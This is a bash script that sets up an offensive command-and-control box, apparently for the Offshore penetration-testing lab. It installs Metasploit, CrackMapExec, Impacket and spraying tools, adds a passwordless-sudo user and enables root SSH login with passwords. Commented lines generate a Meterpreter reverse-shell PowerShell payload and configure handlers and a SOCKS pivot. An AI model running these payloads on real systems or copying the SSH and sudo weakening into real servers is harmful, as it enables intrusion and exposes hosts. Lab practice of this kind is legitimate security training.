#!/usr/bin/bash
####################################
####      c2 setup script       ####
####         Author:            ####
####         p4yl0ad            ####
####    forever braindamaged    ####
####################################

if [ "$EUID" -ne 0 ]
  then printf "\n[+] Note: Run as root\n"
  exit
fi

if [ -f /status.txt ]; 
  then printf "\nStatus file found, are you stupid?\n"
	exit
fi

echo "[+][+] Updates & apt packages" >> /status.txt
echo "[+] Installing essentialls" >> /status.txt
apt-get update -y
apt-get install -y proxychains4 smbclient mlocate mingw-w64 binutils-mingw-w64 g++-mingw-w64 nmap p7zip-full p7zip-rar git wget vim tmux python3-pip remmina psmisc rubygems libssl-dev liblzo2-dev libpam0g-dev make build-essential rdesktop qpdf 

echo "[+] CTF shit" >> /status.txt
apt-get install -y binwalk exiftool pigs

echo "[+][+] Tools " >> /status.txt
echo "[+] Metasploit Install" >> /status.txt
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /opt/msfinstall && \
  chmod 755 /opt/msfinstall && \
  cd /opt &&\
  ./msfinstall
  
echo "[+] Evil-WinRM Install" >> /status.txt
apt install ruby-dev
gem install evil-winrm
  
echo "[+] Covenant Install" >> /status.txt
wget -q https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O /opt/packages-microsoft-prod.deb
dpkg -i /opt/packages-microsoft-prod.deb
apt -y update
#apt -y upgrade
#killall apt #if breaks lol
apt -y install apt-transport-https
apt -y update
apt -y install dotnet-sdk-3.1 dnsutils
rm -rf /opt/packages-microsoft-prod.deb
  
echo "[+] Crackmapexec" >> /status.txt
wget -q https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.1.7dev/cme-ubuntu-latest.zip -O /opt/cme.zip
cd /opt
7z x -aoa cme.zip -o/usr/bin/
cp cme /usr/bin/cme
chmod +x /usr/bin/cme

echo "[+] neo4j for bloodhound" >> /status.txt
echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list
apt-get update
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
apt-get install -y apt-transport-https neo4j
systemctl stop neo4j


# cd /usr/bin
# sudo ./neo4j console
#vim /etc/neo4j/neo4j.conf
#uncomment #dbms.default_listen_address=0.0.0.0
#systemctl start neo4j

# neo4j tunneling
# localhost:7687
# http://localhost:7474/




echo "[+][+] wedoalittlebit(misc)oftooling" >> /status.txt
git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket; cd /opt/impacket; python3 -m pip install .
git clone https://github.com/byt3bl33d3r/SprayingToolkit.git /opt/SprayingToolkit; cd /opt/SprayingToolkit; sudo pip3 install -r requirements.txt

echo "[+][+] openvpn infra" >> /status.txt
echo "[+] openssl" >> /status.txt
wget -q https://www.openssl.org/source/openssl-1.0.2s.tar.gz -O /opt/openssl-1.0.2s.tar.gz
tar xvzf /opt/openssl-1.0.2s.tar.gz -C /opt/
cd /opt/openssl-1.0.2s
./config -Wl,--enable-new-dtags,-rpath,'$(LIBRPATH)'
make
make install
ln -s /usr/local/ssl/bin/openssl /usr/bin/openssl
ln -s /usr/local/ssl/bin/openssl /usr/local/bin/openssl

echo "[+] lzo" >> /status.txt
wget -q http://www.oberhumer.com/opensource/lzo/download/lzo-2.10.tar.gz -O /opt/lzo-2.10.tar.gz
tar xf lzo-2.10.tar.gz -C /opt/
cd /opt/lzo-2.10
./configure
make
make install

echo "[+] openvpn" >> /status.txt
#wget -q https://swupdate.openvpn.org/community/releases/openvpn-2.4.7.tar.gz -O openvpn-2.4.7.tar.gz
wget -q https://swupdate.openvpn.org/community/releases/openvpn-2.5.3.tar.gz -O /opt/openvpn-2.5.3.tar.gz
tar xvzf /opt/openvpn-2.5.3.tar.gz -C /opt/
cd /opt/openvpn-2.5.3
./configure
make
make install
ln -s /opt/openvpn-2.5.3/src/openvpn /usr/bin/openvpn

echo "[+][+] user mgmt" >> /status.txt
echo "[+] ssh user" >> /status.txt
usertoadd="codex"

sudouserpass=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
echo $sudouserpass > /root/codex_pass.txt
useradd $usertoadd --create-home --password "$(openssl passwd -1 $sudouserpass)" --shell /bin/bash -G sudo 2>/dev/null
echo "codex ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
chown $usertoadd:$usertoadd /opt -R

echo "[+] SSH Shit" >> /status.txt
systemctl enable ssh.service
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i "/^[^#]*PasswordAuthentication[[:space:]]no/c\PasswordAuthentication yes" /etc/ssh/sshd_config
systemctl restart ssh
service sshd restart

echo "[+] speed shit" >> /status.txt
echo "alias cifg='curl ifconfig.so;echo'" >> /home/codex/.bashrc
echo "alias cifg='curl ifconfig.so;echo'" >> /root/.bashrc
echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /home/codex/.bashrc
echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /root/.bashrc

# GRC command colouring
echo "source ~/.bashrc" >> ~/.bash_profile
echo 'set-option -g default-shell "/bin/bash"' >> ~/.tmux.conf


commandtoadd="Zm9yIGNtZCBpbiBwcm94eWNoYWluczQgaXAgbm1hcCBnKysgZ2FzIGhlYWQgbWFrZSBsZCBwaW5nNiB0YWlsIHRyYWNlcm91dGU2ICQoIGxzIC91c3Ivc2hhcmUvZ3JjLyApOyBkbwogIGNtZD0iJHtjbWQjIypjb25mLn0iCiAgdHlwZSAiJHtjbWR9IiA+L2Rldi9udWxsIDI+JjEgJiYgYWxpYXMgIiR7Y21kfSI9IiQoIHdoaWNoIGdyYyApIC0tY29sb3VyPWF1dG8gJHtjbWR9Igpkb25l"

echo -n $commandtoadd | base64 -d

echo -n $commandtoadd | base64 -d >> ~/.bashrc
echo "" >> ~/.bashrc

echo "[+] msf openssl cert " >> /status.txt
mkdir /home/codex/Offshore ;\
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/rsaprivate.key -out /tmp/servercertificate.crt -subj '/CN=localhost'
cat /tmp/rsaprivate.key /tmp/servercertificate.crt > /home/codex/Offshore/msf.pem
rm -rf /tmp/rsaprivate.key /tmp/servercertificate.crt

#### psh-net loader ####
#msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=tun0 LPORT=443 HandlerSSLCert=/home/p4yl0ad/Offshore/msf.pem StagerVerifySSLCert=true -f psh-net -o reverse_winhttps_443.ps1
#### PIVOTING AND PASSING SOCKS ####

#sudo msfdb init

#cat << EOF >> /home/codex/Offshore/tun.rc
#spool msf.log
#set Prompt AyyLmao
#set PromptChar >
#
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_winhttps
#set HandlerSSLCert /home/codex/Offshore/msf.pem
#set SessionCommunicationTimeout 600
#set LHOST tun0
#set LPORT 443
#set EXITFUNC thread
#set EXITONSESSION false
#exploit -j
#
#set payload linux/x64/meterpreter/reverse_tcp
#set LHOST tun0
#set LPORT 4443
#set EXITFUNC thread
#set EXITONSESSION false
#exploit -j
#
#set payload linux/x86/shell_reverse_tcp
#set LHOST tun0
#set LPORT 4444
#set EXITFUNC thread
#set EXITONSESSION false
#exploit -j
#
#use auxiliary/server/socks_proxy
#set VERSION 5
#set SRVHOST tun0
#set SRVPORT 1080
#exploit -j
#EOF

#msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=tun0 LPORT=443 HandlerSSLCert=/home/codex/Offshore/msf.pem StagerVerifySSLCert=true -f psh-net -o /home/codex/Offshore/reverse_winhttps_443.ps1

sudo chown p4yl0ad /opt/ -R
su p4yl0ad
echo 'PS1="[\[\033[32m\]\w]\[\033[0m\]\n\[\033[1;31m\]\u\[\033[1;33m\]-> \[\033[0m\]"' >> /home/codex/.bashrc && source /home/codex/.bashrc
cd ~

for i in range {0..69}; do echo sudo cat /root/codex_pass.txt; done
# fucking kek
sudo echo "[!] Dunning kreuger [!]" >> /status.txt
